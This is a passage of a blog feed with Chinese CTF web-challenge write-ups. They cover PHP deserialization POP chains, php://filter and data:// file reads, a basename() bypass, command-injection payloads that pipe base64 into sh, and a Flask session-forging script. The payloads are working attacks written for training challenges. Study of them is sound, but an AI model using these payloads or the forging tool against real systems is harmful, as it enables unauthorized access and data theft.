$this-&gt;passwd === &quot;ctf&quot;)&#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &quot;Just a bit more!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($p)</span><br></pre></td></tr></table></figure>

<p>poc:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class wllm</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $admin=&#x27;admin&#x27;;</span><br><span class="line">    public $passwd=&#x27;ctf&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new wllm();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>先执行__construct</p>
<p>后赋值，加深一下印象</p>
<p>NSSCTF{60cf6a40-176b-4555-8001-d99a70d1385e}</p>
<h2 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到这一行<code>include(&quot;flag.php&quot;);//here I changed those two</code></p>
<p>所以直接比较不了，所以考察了一个php特性，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(null==0)   true</span><br><span class="line">if(flase==0)   true</span><br><span class="line">if(ture==&#x27;非null&#x27;)  true</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = [</span><br><span class="line"><span class="string">&#x27;username&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">];</span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$info</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/reserved.variables.server.php">PHP: $_SERVER - Manual</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">案例网址：https://www.shawroot.cc/php/index.php/test/foo?username=root</span><br><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] 	得到：/php/index.php/test/foo</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] 得到：/php/index.php/test/foo?username=root</span><br></pre></td></tr></table></figure>

<p>basename() 函数返回路径中的文件名部分。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/testweb/home.php&quot;</span>;</span><br><span class="line"><span class="comment">//显示带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="comment">//显示不带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>,<span class="string">&quot;.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出示例</span></span><br><span class="line">home.php</span><br><span class="line">home</span><br></pre></td></tr></table></figure>

<ul>
<li><p>其中<code>$_SERVER[&#39;PHP_SELF&#39;]</code>的值会到<code>basename()</code>函数中</p>
</li>
<li><p>其绕过原理为：在使用默认语言环境设置时，<code>basename()</code> 会删除文件名开头的非 ASCII 字符和中文，</p>
</li>
<li><p>这可以用来通过上面的正则过滤</p>
<p> url编码绕show_source</p>
</li>
<li><p>因为当我们传入<code>index.php/utils.php</code>时，仍然请求的是<code>index.php</code>，</p>
</li>
<li><p>但是当<code>basename()</code>处理后，<code>highlight_file()</code>得到的参数就变成了<code>utils.php</code>，从而我们就实现了任意文件包含</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/utils.php/%ff?%73how_source=1</span><br><span class="line">或者</span><br><span class="line">/index.php/utils.php/%ff?%73%68%6f%77%5f%73%6f%75%72%63%65=1</span><br></pre></td></tr></table></figure>

<h2 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a>PseudoProtocols</h2><p>hint is hear Can you find out the hint.php?</p>
<p>get传参伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure>

<p>PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4&#x3D;</p>
<p>访问&#x2F;test2222222222222.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;max_execution_time&quot;, &quot;180&quot;);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a= $_GET[&quot;a&quot;];</span><br><span class="line">if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;</span><br><span class="line">    echo &quot;success\n&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=data://text/plain,I want flag</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF-2019-Ping-Ping-Ping已解决"><a href="#GXYCTF-2019-Ping-Ping-Ping已解决" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping已解决"></a>[GXYCTF 2019]Ping Ping Ping已解决</h2><p>解法一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>

<p>解法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<p>解法三</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;a=ag;b=fl;tac$IFS$9$b$a.php</span><br></pre></td></tr></table></figure>

<h2 id="NISACTF-2022-checkin"><a href="#NISACTF-2022-checkin" class="headerlink" title="[NISACTF 2022]checkin"></a>[NISACTF 2022]checkin</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">// ‮⁦NISACTF⁩⁦Welcome to</span><br><span class="line">if (&quot;jitanglailo&quot; == $_GET[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; &quot;‮⁦ Flag!⁩⁦N1SACTF&quot; == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) &#123; //tnnd! weishenme b</span><br><span class="line">    echo $FLAG;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>不可见字符，unicode字符</p>
<p>复制到txt文档中010打开后就提取16进制替换空格为百分号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6%20Flag%21%E2%81%A9%E2%81%A6N1SACTF</span><br></pre></td></tr></table></figure>

<h2 id="GKCTF-2020-cve版签到"><a href="#GKCTF-2020-cve版签到" class="headerlink" title="[GKCTF 2020]cve版签到"></a>[GKCTF 2020]cve版签到</h2><h2 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="SWPUCTF 2021 新生赛]pop"></a>SWPUCTF 2021 新生赛]pop</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m;</span><br><span class="line">$b=new w33m;</span><br><span class="line">$c=new w44m;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$b-&gt;w22m=&#x27;Getflag&#x27;;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<h2 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include($_POST[&quot;flag&quot;]);</span><br><span class="line">//flag in /var/www/html/flag.php;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = $_POST[&quot;flag&quot;];</span><br><span class="line">if (strlen(file_get_contents(&#x27;php://input&#x27;)) &lt; 800 &amp;&amp; preg_match(&#x27;/flag/&#x27;, $path)) &#123;</span><br><span class="line">    echo &#x27;nssctf waf!&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @include($path);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>post内容大于800即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">垃圾数据&amp;flag=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>-nss</tag>
      </tags>
  </entry>
  <entry>
    <title>nss2</title>
    <url>/2023/05/23/nss2/</url>
    <content><![CDATA[<h2 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h2><p><strong>flask session 伪造</strong></p>
<p>decode.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!/usr/bin/env python3</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"> </span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line"> </span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"> </span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line"> </span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line"> </span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python decode.py 密文</span><br></pre></td></tr></table></figure>

<p>encode.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!/usr/bin/env python3</span><br><span class="line">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span><br><span class="line">__author__ = &#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span><br><span class="line"> </span><br><span class="line"># standard imports</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import ast</span><br><span class="line"> </span><br><span class="line"># Abstract Base Classes (PEP 3119)</span><br><span class="line">if sys.version_info[0] &lt; 3: # &lt; 3.0</span><br><span class="line">    raise Exception(&#x27;Must be using at least Python 3&#x27;)</span><br><span class="line">elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    from abc import ABCMeta, abstractmethod</span><br><span class="line">else: # &gt; 3.4</span><br><span class="line">    from abc import ABC, abstractmethod</span><br><span class="line"> </span><br><span class="line"># Lib for argument parsing</span><br><span class="line">import argparse</span><br><span class="line"> </span><br><span class="line"># external Imports</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"> </span><br><span class="line">class MockApp(object):</span><br><span class="line"> </span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"> </span><br><span class="line">if sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    class FSCM(metaclass=ABCMeta):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                if(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"> </span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"> </span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"> </span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"> </span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line">else: # &gt; 3.4</span><br><span class="line">    class FSCM(ABC):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                if(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"> </span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"> </span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"> </span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"> </span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # Args are only relevant for __main__ usage</span><br><span class="line">    </span><br><span class="line">    ## Description for help</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=&#x27;Flask Session Cookie Decoder/Encoder&#x27;,</span><br><span class="line">                epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)</span><br><span class="line"> </span><br><span class="line">    ## prepare sub commands</span><br><span class="line">    subparsers = parser.add_subparsers(help=&#x27;sub-command help&#x27;, dest=&#x27;subcommand&#x27;)</span><br><span class="line"> </span><br><span class="line">    ## create the parser for the encode command</span><br><span class="line">    parser_encode = subparsers.add_parser(&#x27;encode&#x27;, help=&#x27;encode&#x27;)</span><br><span class="line">    parser_encode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Secret key&#x27;, required=True)</span><br><span class="line">    parser_encode.add_argument(&#x27;-t&#x27;, &#x27;--cookie-structure&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Session cookie structure&#x27;, required=True)</span><br><span class="line"> </span><br><span class="line">    ## create the parser for the decode command</span><br><span class="line">    parser_decode = subparsers.add_parser(&#x27;decode&#x27;, help=&#x27;decode&#x27;)</span><br><span class="line">    parser_decode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Secret key&#x27;, required=False)</span><br><span class="line">    parser_decode.add_argument(&#x27;-c&#x27;, &#x27;--cookie-value&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Session cookie value&#x27;, required=True)</span><br><span class="line"> </span><br><span class="line">    ## get args</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">    ## find the option chosen</span><br><span class="line">    if(args.subcommand == &#x27;encode&#x27;):</span><br><span class="line">        if(args.secret_key is not None and args.cookie_structure is not None):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    elif(args.subcommand == &#x27;decode&#x27;):</span><br><span class="line">        if(args.secret_key is not None and args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        elif(args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure>

<p>密码是猜出的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python encode.py encode -s &#x27;LitCTF&#x27; -t &#x27;&#123; &quot;name&quot;: &quot;admin&quot; &#125;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="蓝帽杯-2022-初赛-计算机取证-1"><a href="#蓝帽杯-2022-初赛-计算机取证-1" class="headerlink" title="[蓝帽杯 2022 初赛]计算机取证_1"></a>[蓝帽杯 2022 初赛]计算机取证_1</h2><p>下载安装，看kali工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python vol.py -f  /home/zhou/桌面/1.dmp windows.hashdump</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/23/nss2/QQ%E6%88%AA%E5%9B%BE20230702134524.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7f21caca5685f10d9e849cc84c340528</span><br></pre></td></tr></table></figure>

<p>然后解密，咋解，还没想好</p>
<p>现对一个windows计算机进行取证，请您对以下问题进行分析解答。<br>制作该内存镜像的进程Pid号是多少</p>
<p>python vol.py -f  &#x2F;home&#x2F;zhou&#x2F;桌面&#x2F;2.dmp windows.pslist</p>
<p><img src="/2023/05/23/nss2/QQ%E6%88%AA%E5%9B%BE20230702140146.png"></p>
<h2 id="UUCTF-2022-新生赛-ezrce"><a href="#UUCTF-2022-新生赛-ezrce" class="headerlink" title="[UUCTF 2022 新生赛]ezrce"></a>[UUCTF 2022 新生赛]ezrce</h2><h2 id="SWPUCTF-2022-新生赛-numgame"><a href="#SWPUCTF-2022-新生赛-numgame" class="headerlink" title="[SWPUCTF 2022 新生赛]numgame"></a>[SWPUCTF 2022 新生赛]numgame</h2><p>打开查看源码可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:28528/NsScTf.php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//hint: 与get相似的另一种请求协议是什么呢</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span 